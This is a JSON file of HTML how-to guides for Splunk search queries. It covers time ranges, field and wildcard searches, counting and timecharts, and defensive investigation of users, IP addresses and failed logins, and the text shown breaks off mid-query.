{
  "guides": {
    "basics": [
      {
        "id": "search-time-range",
        "title": "How to search a specific time range",
        "description": "Find events from the last hour, a specific day, or any custom time window.",
        "keywords": "time range earliest latest timerange date hour day week",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to find events from a specific time period - maybe the last hour, yesterday, or a particular window when something happened.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Quick Way (Time Picker)</div>\n                    <div class=\"guide-detail-section\">\n                        <p>The easiest way is using Splunk's time picker dropdown (top right of the search bar). Select presets like \"Last 15 minutes\" or \"Last 24 hours\".</p>\n                        <p>But sometimes you need more control - that's when you use time modifiers in your search.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using Time Modifiers</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Last N minutes/hours/days</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main earliest=-1h</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Events from the last 1 hour. Use <code>-15m</code> for 15 minutes, <code>-7d</code> for 7 days, <code>-1w</code> for 1 week.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Specific time window</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main earliest=-24h latest=-1h</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Events from 24 hours ago up until 1 hour ago. Useful for excluding recent events.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Specific date/time</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main earliest=\"01/15/2024:09:00:00\" latest=\"01/15/2024:17:00:00\"</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Events from 9 AM to 5 PM on January 15, 2024.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Snap to time boundaries</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main earliest=-1d@d latest=@d</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Yesterday (midnight to midnight). The <code>@d</code> \"snaps\" to the start of the day.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Common Time Shortcuts</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><code>-1h</code> = 1 hour ago</li>\n                            <li><code>-30m</code> = 30 minutes ago</li>\n                            <li><code>-7d</code> = 7 days ago</li>\n                            <li><code>-1w</code> = 1 week ago</li>\n                            <li><code>-1mon</code> = 1 month ago</li>\n                            <li><code>@d</code> = start of today</li>\n                            <li><code>@h</code> = start of current hour</li>\n                            <li><code>@w0</code> = start of this week (Sunday)</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Always start with the smallest time range that makes sense. Searching \"All Time\" on a busy index can take forever and time out. Start with 15 minutes, then expand if needed.</p>\n                </div>\n            "
      },
      {
        "id": "search-specific-value",
        "title": "How to search for a specific user, IP, or value",
        "description": "Find all events containing a specific username, IP address, hostname, or any other value.",
        "keywords": "user username ip address hostname search find specific value field",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You have a specific value - a username, IP address, hostname, or error message - and you want to find all events that contain it.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Basic Search</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Just type it</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main jsmith</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Finds any event containing \"jsmith\" anywhere in the raw text. Simple but may find false matches.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Search a specific field</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main user=jsmith</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Finds events where the <code>user</code> field equals \"jsmith\". More precise.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Search for an IP</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main src_ip=192.168.1.100</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Events from a specific source IP. Use <code>dest_ip</code> for destination.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Combine Multiple Values</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">AND - both must match</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main user=jsmith action=login</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Events where user is jsmith AND action is login. Putting terms next to each other implies AND.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">OR - either can match</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main user=jsmith OR user=admin</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Events for jsmith OR admin. Note: OR must be uppercase.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">NOT - exclude matches</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main user=jsmith NOT action=logout</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Events for jsmith, excluding logouts.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Finding the Right Field Name</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Not sure what field to use? Run a simple search and look at the \"Fields\" sidebar on the left. Click a field to see its values. Common fields:</p>\n                        <ul>\n                            <li><code>user</code>, <code>username</code>, <code>account_name</code> - User identifiers</li>\n                            <li><code>src_ip</code>, <code>src</code>, <code>source_ip</code> - Source addresses</li>\n                            <li><code>dest_ip</code>, <code>dest</code>, <code>destination_ip</code> - Destination addresses</li>\n                            <li><code>host</code> - The system that generated the log</li>\n                            <li><code>action</code>, <code>status</code> - What happened</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Use quotes for values with spaces or special characters: <code>user=\"John Smith\"</code> or <code>message=\"error: connection failed\"</code></p>\n                </div>\n            "
      },
      {
        "id": "search-wildcards",
        "title": "How to use wildcards to find partial matches",
        "description": "Find events when you only know part of a value, like \"admin*\" or \"*failed*\".",
        "keywords": "wildcard asterisk star partial match pattern",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to find events but you only know part of the value. Maybe you're looking for any user starting with \"admin\" or any error containing \"timeout\".</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using the Asterisk (*)</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Starts with</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main user=admin*</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Matches admin, administrator, admin_backup, admin123, etc.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Ends with</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main host=*-prod</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Matches web-prod, db-prod, app-prod, etc.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Contains</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main *timeout*</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Matches any event containing \"timeout\" anywhere.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Multiple wildcards</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=main src_ip=192.168.1.*</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Matches any IP in the 192.168.1.x subnet.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Common Patterns</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><code>user=svc_*</code> - All service accounts (if they start with svc_)</li>\n                            <li><code>host=*dc*</code> - All domain controllers (if \"dc\" is in hostname)</li>\n                            <li><code>sourcetype=*:security</code> - All security-related sourcetypes</li>\n                            <li><code>*error* OR *fail*</code> - Any error or failure message</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout warning\">\n                    <div class=\"guide-callout-title\">Performance Warning</div>\n                    <p><strong>Leading wildcards are slow.</strong> Searching <code>*something</code> is much slower than <code>something*</code> because Splunk can't use its index efficiently.</p>\n                    <p>If possible, restructure your search to avoid leading wildcards, or accept that it will take longer.</p>\n                </div>\n            "
      },
      {
        "id": "search-index-sourcetype",
        "title": "How to search the right data (index and sourcetype)",
        "description": "Understand where your data lives and how to search the correct logs.",
        "keywords": "index sourcetype data source logs where find",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You need to search the right data. Splunk organizes data into <strong>indexes</strong> (like folders) and <strong>sourcetypes</strong> (like file formats). Knowing these helps you search faster and find the right logs.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Index = Where Data Lives</div>\n                    <div class=\"guide-detail-section\">\n                        <p>An index is like a bucket that holds related data. Common setups:</p>\n                        <ul>\n                            <li><code>index=main</code> - Often the default catch-all</li>\n                            <li><code>index=security</code> - Security-related logs</li>\n                            <li><code>index=network</code> - Firewall, DNS, proxy logs</li>\n                            <li><code>index=windows</code> - Windows event logs</li>\n                        </ul>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user=jsmith</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Search for jsmith only in security logs.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Sourcetype = Type of Log</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Sourcetype identifies what kind of log it is, which determines how it's parsed:</p>\n                        <ul>\n                            <li><code>sourcetype=WinEventLog:Security</code> - Windows Security events</li>\n                            <li><code>sourcetype=syslog</code> - Standard syslog format</li>\n                            <li><code>sourcetype=pan:traffic</code> - Palo Alto firewall traffic</li>\n                            <li><code>sourcetype=aws:cloudtrail</code> - AWS CloudTrail logs</li>\n                        </ul>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=windows sourcetype=WinEventLog:Security EventCode=4625</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Failed logon events from Windows Security logs.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">How to Find Available Indexes</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>| eventcount summarize=false index=* | table index count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Lists all indexes you have access to and their event counts.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">How to Find Sourcetypes</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | stats count by sourcetype</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows all sourcetypes in the security index.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p><strong>Always specify an index.</strong> Searching <code>index=*</code> or omitting the index searches everything, which is slow and may hit data you don't need. Ask your Splunk admin which indexes contain the data you need.</p>\n                </div>\n            "
      }
    ],
    "summarizing": [
      {
        "id": "count-events",
        "title": "How to count events",
        "description": "Get a simple count of how many events match your search.",
        "keywords": "count total number how many events",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to know \"how many?\" - how many login failures, how many errors, how many events from a host.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Basic Count</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Total count</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=failure | stats count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Returns a single number: total failed actions.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Count by Category</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Count per user</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=failure | stats count by user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows how many failures each user had.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Count per source IP</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=failure | stats count by src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows failures grouped by source IP.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Count by multiple fields</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | stats count by user, action</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows count for each combination of user and action.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Sorting Results</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=failure | stats count by user | sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Sort by count descending (highest first). Remove the <code>-</code> for ascending.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Give It a Better Name</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=failure | stats count as failures by user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Names the column \"failures\" instead of \"count\".</p>\n                    </div>\n                </div>\n            "
      },
      {
        "id": "find-top-values",
        "title": "How to find the most common values",
        "description": "See the top users, IPs, errors, or any field values by frequency.",
        "keywords": "top most common frequent values top 10 popular",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to see which values appear most often - the top talkers, most active users, most common errors.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using top</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Top 10 users</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | top user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows the 10 most common users with count and percentage.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Top 20 source IPs</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=network | top limit=20 src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows top 20 instead of default 10.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Top combinations</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | top user, action</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Most common user + action pairs.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Finding Rare Values</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | rare user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows the LEAST common values - useful for finding anomalies.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Count Without Percentages</div>\n                    <div class=\"guide-detail-section\">\n                        <p>If you just want counts without the percentage columns:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | top user | fields user count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Removes the percent column, keeping just user and count.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout note\">\n                    <div class=\"guide-callout-title\">top vs stats count</div>\n                    <p>Both can show counts by field:</p>\n                    <ul>\n                        <li><code>top user</code> - Quick, includes percentage, limited to top N</li>\n                        <li><code>stats count by user | sort -count</code> - More flexible, shows all values</li>\n                    </ul>\n                    <p>Use <code>top</code> for a quick look, <code>stats</code> when you need more control.</p>\n                </div>\n            "
      },
      {
        "id": "count-unique",
        "title": "How to count unique values",
        "description": "Find how many different users, IPs, or hosts appear in your results.",
        "keywords": "unique distinct count dc different values how many unique",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to know how many <em>different</em> values exist - how many unique users logged in, how many distinct IPs connected, how many different hosts are affected.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Distinct Count (dc)</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Count unique users</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | stats dc(user) as unique_users</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Returns the number of different users in the results.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Unique IPs per host</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=network | stats dc(src_ip) as unique_sources by dest_host</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">How many different IPs connected to each destination host.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Combine with Regular Count</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | stats count, dc(user) as unique_users by src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">For each source IP: total events AND number of different users. Useful for detecting password spraying (many users from one IP).</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">See the Actual Values</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">List unique values</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | stats values(user) as users by src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows the actual user names, not just the count.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Both count and values</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | stats dc(user) as user_count, values(user) as users by src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows both the count and the actual values.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p><code>dc()</code> stands for \"distinct count\". It's one of the most useful stats functions for security analysis - finding one IP hitting many users, one user accessing many systems, etc.</p>\n                </div>\n            "
      },
      {
        "id": "count-over-time",
        "title": "How to see activity over time",
        "description": "Create a timeline showing how event counts change hour by hour or day by day.",
        "keywords": "timeline time series over time timechart hourly daily trend",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to see how activity changes over time - is there a spike at 3 AM? Did errors increase yesterday? What's the trend?</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using timechart</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Events per hour</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | timechart span=1h count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows event count for each hour. Displays as a line chart.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Events per day</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | timechart span=1d count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Daily counts - good for weekly patterns.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Split by field</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | timechart span=1h count by action</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows a line for each action type (success, failure, etc).</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Common Time Spans</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><code>span=1m</code> - Per minute (for real-time or short windows)</li>\n                            <li><code>span=5m</code> - Every 5 minutes</li>\n                            <li><code>span=1h</code> - Hourly (most common)</li>\n                            <li><code>span=1d</code> - Daily</li>\n                            <li><code>span=1w</code> - Weekly</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Spot Anomalies</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=failure\n| timechart span=1h count\n| where count > 100</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find hours with more than 100 failures.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Match your span to your time range. If you're searching 7 days, <code>span=1h</code> gives 168 data points - plenty for a chart. Searching 1 hour? Use <code>span=1m</code> for detail.</p>\n                </div>\n            "
      }
    ],
    "security": [
      {
        "id": "investigate-user",
        "title": "How to see what a user did",
        "description": "Build a timeline of all activity for a specific user account.",
        "keywords": "user activity timeline what did user do investigate account",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You have a username and need to understand what that account did - logins, file access, commands run, systems accessed.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Start Broad</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Find all events for the user</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=* user=jsmith earliest=-24h</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Everything mentioning jsmith in the last 24 hours, across all indexes.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">See what data sources have activity</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=* user=jsmith | stats count by index, sourcetype</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows where this user appears - helps you focus your search.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Build a Timeline</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=* user=jsmith\n| table _time, sourcetype, action, src_ip, dest, _raw\n| sort _time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Chronological list of activity with key fields.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Focus Areas</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Authentication activity</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user=jsmith (action=login OR action=logout OR action=failure)\n| table _time, action, src_ip, dest, result</code></pre>\n                        </div>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Systems accessed</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=* user=jsmith | stats count, earliest(_time) as first, latest(_time) as last by dest</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Which systems did this user touch, when first and last?</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Source locations</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=* user=jsmith | stats count by src_ip | iplocation src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Where did logins come from? Add geographic context.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Users might appear under different field names (<code>user</code>, <code>username</code>, <code>account_name</code>, <code>src_user</code>). Search broadly first: <code>jsmith</code> without specifying a field.</p>\n                </div>\n            "
      },
      {
        "id": "investigate-ip",
        "title": "How to track activity from an IP address",
        "description": "See everything an IP address did - connections, logins, requests.",
        "keywords": "ip address activity track investigate source destination connections",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You have a suspicious IP address and need to understand what it did - what systems it connected to, what accounts it tried to use, what it transferred.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Find All Activity</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=* 192.168.1.100 earliest=-24h</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Everything mentioning this IP anywhere. Broad but effective starting point.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">See data sources</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=* 192.168.1.100 | stats count by index, sourcetype</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Which logs contain this IP?</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">As Source (Outbound)</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">What did this IP connect to?</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=network src_ip=192.168.1.100\n| stats count by dest_ip, dest_port\n| sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Destinations and ports this IP connected to.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">What accounts did it use?</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security src_ip=192.168.1.100\n| stats count by user, action</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Accounts and actions from this source.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">As Destination (Inbound)</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Who connected to this IP?</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=network dest_ip=192.168.1.100\n| stats count by src_ip, dest_port\n| sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Sources connecting to this system.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Timeline</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=* src_ip=192.168.1.100 OR dest_ip=192.168.1.100\n| timechart span=1h count by sourcetype</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Activity over time, split by log type.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>IPs can appear in many fields: <code>src_ip</code>, <code>dest_ip</code>, <code>src</code>, <code>dest</code>, <code>client_ip</code>, etc. Start with a raw search for the IP to catch all variations.</p>\n                </div>\n            "
      },
      {
        "id": "find-failed-logins",
        "title": "How to find failed login attempts",
        "description": "Identify failed authentication attempts and who/where they came from.",
        "keywords": "failed login authentication failure password attempt locked",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to find authentication failures - failed passwords, locked accounts, rejected logins. This helps identify attacks or user issues.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Windows Authentication Failures</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Failed logons (Event 4625)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=windows sourcetype=WinEventLog:Security EventCode=4625\n| table _time, user, src_ip, Failure_Reason</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Windows failed login events with reason.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Account lockouts (Event 4740)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=windows sourcetype=WinEventLog:Security EventCode=4740\n| table _time, user, ComputerName</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Accounts that got locked out.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Generic Authentication Logs</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security (action=failure OR status=failed OR 